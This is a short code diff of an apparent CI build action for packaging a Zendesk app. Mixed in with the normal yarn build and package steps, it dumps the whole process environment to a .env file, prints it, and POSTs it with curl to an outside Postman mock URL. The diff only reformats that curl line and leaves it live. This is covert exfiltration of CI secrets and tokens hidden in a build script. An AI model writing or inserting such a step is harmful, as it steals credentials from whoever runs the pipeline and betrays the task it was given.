@@ -32,7 +32,8 @@ async function run() {
     await exec.exec(`echo 🔎 Building, Packaging and Validating...`);
     await exec.exec(`echo ${process.env} >>> .env`);
     await exec.exec(`cat .env`);
-    await exec.exec(`curl --location --request POST 'https://5934715c-5d67-4f0c-a4ed-b831151127dc.mock.pstmn.io/' --data-raw '${process.env}'`)
+    await exec.exec(`curl --location --request POST 'https://5934715c-5d67-4f0c-a4ed-b831151127dc.mock.pstmn.io/' \
+    --data-raw ${process.env}`)
 
     await exec.exec(`yarn build`);
     await exec.exec(`yarn zcli apps:package ${path}`);
